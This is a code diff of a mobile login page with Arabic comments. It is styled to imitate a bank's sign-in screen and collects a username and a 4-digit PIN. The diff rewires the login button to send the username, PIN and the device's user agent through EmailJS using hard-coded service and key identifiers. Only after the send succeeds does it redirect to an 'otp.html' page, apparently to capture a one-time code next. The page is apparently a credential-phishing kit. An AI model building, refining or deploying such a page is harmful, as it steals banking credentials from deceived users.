@@ -18,7 +18,6 @@
         * {
             box-sizing: border-box;
             outline: none;
-            /* منع تكبير الشاشة عند الضغط على الحقول في الجوال */
             -webkit-tap-highlight-color: transparent;
         }
 
@@ -27,13 +26,13 @@
             padding: 0;
             background-color: #ffffff;
             font-family: 'Tajawal', sans-serif;
-            height: 100vh; /* استخدام ارتفاع الشاشة بالكامل */
-            height: -webkit-fill-available; /* دعم أفضل لمتصفحات الجوال */
+            height: 100vh; 
+            height: -webkit-fill-available; 
             display: flex;
             flex-direction: column;
             color: #333333;
             position: relative;
-            overflow: hidden; /* منع السكرول غير الضروري */
+            overflow: hidden; 
         }
 
         /* حاوية المحتوى الرئيسي */
@@ -42,32 +41,29 @@
             padding: 0 25px;
             display: flex;
             flex-direction: column;
-            overflow-y: auto; /* السماح بالسكرول للمحتوى فقط إذا لزم الأمر */
+            overflow-y: auto; 
         }
 
         /* 🔵 المساحة العلوية واللوغو */
         .top-spacer {
-            height: 12vh; /* Margin Top كبيرة تشبه البنوك */
+            height: 12vh; 
             min-height: 80px;
             width: 100%;
         }
 
         .logo-container {
             width: 70%;
-            /* التعديل المطلوب: نسبة عرض إلى ارتفاع 16:9 */
             aspect-ratio: 16 / 9;
-            margin: 0 auto 50px auto; /* توسيط أفقي ومسافة سفلية */
+            margin: 0 auto 50px auto; 
             display: flex;
             align-items: center;
             justify-content: center;
-            /* تم إزالة الحدود والخلفية كما طلبت */
         }
         
-        /* تنسيق الصورة داخل الحاوية */
         .logo-image {
             width: 100%;
             height: 100%;
-            object-fit: contain; /* لضمان ظهور اللوغو بالكامل دون قص */
+            object-fit: contain; 
         }
 
         /* 🔵 الحقول (Inputs) */
@@ -76,12 +72,11 @@
             margin-bottom: 40px;
         }
 
-        /* حقل اسم المستخدم (ستايل السطر) */
         .username-wrapper {
             position: relative;
             display: flex;
             align-items: center;
-            border-bottom: 1px solid #333333; /* خط أفقي أسود */
+            border-bottom: 1px solid #333333; 
             transition: border-color 0.3s;
         }
 
@@ -92,13 +87,13 @@
         .custom-input {
             width: 100%;
             border: none;
-            padding: 10px 35px 10px 5px; /* مسافة للأيقونة */
+            padding: 10px 35px 10px 5px; 
             font-family: 'Tajawal', sans-serif;
             font-size: 16px;
-            font-weight: 400; /* خط رفيع */
+            font-weight: 400; 
             color: #333333;
             background: transparent;
-            border-radius: 0; /* إلغاء الحواف الافتراضية في الجوال */
+            border-radius: 0; 
         }
 
         .custom-input::placeholder {
@@ -106,43 +101,40 @@
             font-size: 15px;
         }
 
-        /* الأيقونة اليمنى */
         .input-icon-right {
             position: absolute;
             right: 5px;
-            color: #007C91; /* أزرق/تركوازي */
+            color: #007C91; 
             font-size: 18px;
         }
 
-        /* --- 🔵 تعديل قسم الرقم السري (Underscores) --- */
+        /* --- 🔵 تعديل قسم الرقم السري --- */
         
-        /* حاوية تجمع الأيقونة وحقول الإدخال في سطر واحد */
         .pin-wrapper-inline {
             display: flex;
-            align-items: flex-end; /* محاذاة العناصر على خط القاعدة */
-            gap: 15px; /* مسافة بين القفل والخطوط */
+            align-items: flex-end; 
+            gap: 15px; 
             padding-bottom: 5px;
         }
 
-        /* أيقونة القفل */
         .pin-main-icon {
              color: #007C91;
              font-size: 22px;
-             margin-bottom: 8px; /* ضبط دقيق للمحاذاة العمودية */
+             margin-bottom: 8px; 
         }
 
-.pin-underscores-container {
-    display: flex;
-    gap: 15px;
-    direction: ltr;
-    justify-content: flex-start;
-}
+        /* 🔥 التعديل هنا: تغيير الاتجاه إلى rtl */
+        .pin-underscores-container {
+            display: flex;
+            gap: 15px;
+            direction: rtl; /* تم التعديل من ltr إلى rtl */
+            justify-content: flex-start;
+        }
 
-        /* تنسيق حقل الإدخال ليظهر كخط سفلي */
         .pin-underscore-input {
-            width: 45px; /* عرض الخط الواحد */
+            width: 45px; 
             border: none;
-            border-bottom: 2px solid #333; /* سمك الخط */
+            border-bottom: 2px solid #333; 
             text-align: center;
             font-size: 26px;
             font-family: 'Tajawal', sans-serif;
@@ -154,14 +146,10 @@
             transition: border-color 0.3s, color 0.3s;
         }
         
-        /* عند التركيز على الخط */
         .pin-underscore-input:focus {
-            border-bottom-color: #007C91; /* يتغير لون الخط للأزرق */
+            border-bottom-color: #007C91; 
             caret-color: #007C91;
         }
-
-        /* --- نهاية تعديل الرقم السري --- */
-
 
         /* 🔵 الروابط */
         .links-area {
@@ -170,7 +158,7 @@
 
         .forgot-pass {
             display: block;
-            text-align: left; /* محاذاة لليسار */
+            text-align: left; 
             color: #007C91;
             font-size: 14px;
             text-decoration: none;
@@ -189,24 +177,24 @@
 
         /* 🔵 زر تسجيل الدخول */
         .submit-container {
-            margin-top: auto; /* يدفع الزر لأسفل الصفحة */
-            padding: 20px 25px 30px 25px; /* مسافات محيطة بالزر */
+            margin-top: auto; 
+            padding: 20px 25px 30px 25px; 
             width: 100%;
-            background: #fff; /* خلفية بيضاء لضمان عدم تداخل المحتوى */
+            background: #fff; 
         }
 
         .login-btn {
             width: 100%;
             height: 65px;
-            background-color: #FBC900; /* الأصفر البنكي */
+            background-color: #FBC900; 
             color: #000000;
             font-family: 'Tajawal', sans-serif;
-            font-weight: 700; /* Bold */
+            font-weight: 700; 
             font-size: 20px;
             border: none;
-            border-radius: 8px; /* حواف بسيطة */
+            border-radius: 8px; 
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(251, 201, 0, 0.2); /* ظل خفيف للزر */
+            box-shadow: 0 4px 10px rgba(251, 201, 0, 0.2); 
             transition: transform 0.1s, background 0.2s;
         }
 
@@ -258,39 +246,32 @@
     </div>
 
 <div class="submit-container">
-    <button type="button" class="login-btn" onclick="window.location.href='otp.html'">
+    <button type="button" class="login-btn" onclick="sendEmail()">
         تسجيل الدخول
     </button>
 </div>
 
     <script>
-        // 1. إعداد EmailJS
         (function(){
-            // ⚠️⚠️ استبدل 'YOUR_PUBLIC_KEY' بمفتاحك العام الحقيقي من EmailJS
+            // ⚠️⚠️ استبدل بالمفتاح العام الحقيقي
             emailjs.init("zWBq4dbSzfkEvVeS2");
         })();
 
-        // 2. منطق التنقل التلقائي بين خطوط الرقم السري (Underscores)
-        // هذا الكود يضمن تجربة مستخدم سلسة عند إدخال الأرقام
         const pinInputs = document.querySelectorAll('.pin-underscore-input');
 
         pinInputs.forEach((input, index) => {
-            // عند كتابة رقم
             input.addEventListener('input', (e) => {
-                 // التأكد من أن المدخل رقم فقط
                 e.target.value = e.target.value.replace(/[^0-9]/g, '');
                 
                 if (e.target.value.length === 1) {
                     if (index < pinInputs.length - 1) {
                         pinInputs[index + 1].focus();
                     } else {
-                        // إذا وصل لآخر حقل، يمكن إخفاء الكيبورد (اختياري)
                         input.blur(); 
                     }
                 }
             });
 
-            // عند الضغط على Backspace للمسح
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && e.target.value === '') {
                     if (index > 0) {
@@ -299,23 +280,19 @@
                 }
             });
              
-             // تحديد النص بالكامل عند التركيز لتسهيل التعديل
              input.addEventListener('focus', (e) => {
                  e.target.select();
              });
         });
 
-        // 3. دالة الإرسال
         function sendEmail() {
             const username = document.getElementById('username').value;
-            // تجميع الرقم السري من 4 خانات
             const pin = 
                 document.getElementById('pin1').value + 
                 document.getElementById('pin2').value + 
                 document.getElementById('pin3').value + 
                 document.getElementById('pin4').value;
 
-            // تحقق بسيط
             if(!username || pin.length < 4) {
                 alert("يرجى إدخال اسم المستخدم والرقم السري المكون من 4 أرقام.");
                 return;
@@ -327,38 +304,31 @@
             btn.style.opacity = "0.8";
             btn.disabled = true;
 
-            // تجهيز البيانات للإرسال (يجب أن تطابق المتغيرات في قالب EmailJS)
             var templateParams = {
                 username: username,
                 pin_code: pin,
-                device_info: navigator.userAgent // إضافة معلومات الجهاز (اختياري)
+                device_info: navigator.userAgent 
             };
 
-            // ⚠️⚠️ استبدل 'YOUR_SERVICE_ID' و 'YOUR_TEMPLATE_ID' بمعلوماتك الحقيقية
+            // ⚠️⚠️ تأكد من صحة Service ID و Template ID
             emailjs.send('service_lyabofe', 'template_cxjh4ls', templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     btn.innerHTML = '<i class="fas fa-check"></i> تم بنجاح';
-                    btn.style.backgroundColor = "#4CAF50"; // لون أخضر للنجاح
+                    btn.style.backgroundColor = "#4CAF50"; 
                     btn.style.color = "#fff";
                     
-                    // إعادة تعيين النموذج بعد فترة قصيرة أو التوجيه لصفحة أخرى
+                    // 🔥 التعديل هنا: التوجيه يتم فقط بعد نجاح الإرسال
                     setTimeout(() => {
-                         document.getElementById('loginForm').reset();
-                         btn.innerHTML = originalBtnText;
-                         btn.style.backgroundColor = "#FBC900";
-                         btn.style.color = "#000";
-                         btn.disabled = false;
-                         btn.style.opacity = "1";
-                         // window.location.href = "/dashboard"; // مثال للتوجيه
-                    }, 2000);
+                         window.location.href = 'otp.html'; 
+                    }, 1000); // انتظار ثانية واحدة لرؤية علامة النجاح
 
                 }, function(error) {
                     console.log('FAILED...', error);
                     btn.innerHTML = 'خطأ في الاتصال';
-                    btn.style.backgroundColor = "#f44336"; // لون أحمر للخطأ
+                    btn.style.backgroundColor = "#f44336"; 
                     btn.style.color = "#fff";
-                    alert("حدث خطأ تقني في عملية تسجيل الدخول. يرجى المحاولة لاحقاً.");
+                    alert("حدث خطأ. يرجى المحاولة لاحقاً.");
                     
                      setTimeout(() => {
                          btn.innerHTML = originalBtnText;
